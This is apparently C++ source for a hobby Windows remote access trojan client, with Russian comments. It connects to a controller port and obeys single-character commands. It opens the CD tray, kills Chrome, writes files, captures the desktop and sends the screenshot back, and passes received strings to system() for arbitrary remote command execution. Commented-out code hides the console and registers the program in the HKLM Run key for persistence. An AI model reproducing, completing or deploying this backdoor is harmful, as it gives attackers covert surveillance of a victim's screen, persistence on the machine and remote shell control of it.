#include "pch.h"
#include <iostream>
#pragma comment(lib, "ws2_32.lib")
#include <WinSock2.h>
#pragma warning(disable:4996)
#include <Windows.h>/* Все библиотеки с 6 по 9 строку для открытия дисковода*/
#include <mmsystem.h>
#include <tchar.h>
#pragma comment(lib, "WinMM.Lib")
#include <fstream> //библиотека для работы с файлами(кнопка 5)
#include <gdiplus.h>//всё с 11 по 13 нужно для снятия скриншота
#pragma comment(lib, "GdiPlus.lib")
using namespace Gdiplus;
void screen()
{
	static const GUID png =
	{ 0x557cf406, 0x1a04, 0x11d3, { 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e } };
	//снятие скриншота ===================================
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	HDC scrdc, memdc;
	HBITMAP membit;
	// Получаем HDC рабочего стола
	// Параметр HWND для рабочего стола всегда равен нулю.
	scrdc = GetDC(0);
	// Определяем разрешение экрана
	int Height, Width;
	Height = GetSystemMetrics(SM_CYSCREEN);
	Width = GetSystemMetrics(SM_CXSCREEN);
	// Создаем новый DC, идентичный десктоповскому и битмап размером с экран.
	memdc = CreateCompatibleDC(scrdc);
	membit = CreateCompatibleBitmap(scrdc, Width, Height);
	SelectObject(memdc, membit);
	// Улыбаемся... Снято!
	BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
	HBITMAP hBitmap;
	hBitmap = (HBITMAP)SelectObject(memdc, membit);
	Gdiplus::Bitmap bitmap(hBitmap, NULL);
	bitmap.Save(L"9.png", &png);
	DeleteObject(hBitmap);
	//снятие скриншота завершено ===================================
}
SOCKET Connection;
int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);//прячем окно консоли
	/*Добавление программы в атозагрузку=================
	HKEY hKey;
	char szPath[0x100];
	GetModuleFileName(NULL, szPath, sizeof(szPath));
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		NULL,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_SET_VALUE,
		NULL,
		&hKey,
		NULL);

	if (hKey)
	{
		RegSetValueEx(hKey, "Client_5.exe", NULL, REG_SZ, (LPBYTE)szPath, strlen(szPath));
		RegCloseKey(hKey);
	}
	*/
	//WSAStartup
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	if (WSAStartup(DLLVersion, &wsaData) != 0)
	{
		std::cout << "Error" << std::endl;
		exit(1);
	}
	SOCKADDR_IN addr;
	int sizeofaddr = sizeof(addr);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(9090);
	addr.sin_family = AF_INET;
	for (;; Sleep(75))
	{
		Connection = socket(AF_INET, SOCK_STREAM, NULL);
		if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0)
		{
			;
		}
		else
		{
			std::cout << "Connected!\n";
			char msg[1024];
			while (true)
			{
				recv(Connection, msg, sizeof(msg), NULL);
				if (msg[0]=='0')
				{
					mciSendString(_T("Set cdaudio door open wait"), NULL, 0, NULL); //Открытие привода CD-ROM
				}
				if (msg[0] == '1')
				{
					MessageBoxA(GetForegroundWindow(), "Hello World!", "Hello", NULL);//выодит сообщение
				}
				if (msg[0] == '4')
				{
					system("taskkill /f /im  chrome.exe");
				}
				if (msg[0] == '5')
				{
					std::ofstream outfile("C:\\test.txt");
					outfile << "Hello" << std::endl;
					outfile.close();
				}
				if (msg[0] == 's')
				{
					screen();
					FILE *a = fopen("9.png","rb");
					char buf[810000];
					int len;
					while (len = fread(buf, sizeof(unsigned char), sizeof buf, a))
					{
						std::cout << len << std::endl;
						if (len < 810000)
						{
							send(Connection, buf, len, NULL);
						}
						else
						{
							char msg[256] = "99";//переменная, которую мы отправим клиенту
							send(Connection, msg, sizeof(msg), NULL);//отправляем сообщение клиент
						}
					}
				}
				if (msg[0] == ' ')//управление командной строкой от сервера
				{
					system(msg);
				}
				if (msg[0] == '?')//для того, чтобы сервер мог сам если что отключиться
				{
					Sleep(18000);
					break;
				}
				std::cout << msg<< std::endl;
			}
		}
	}
	system("pause");
	return 0;
}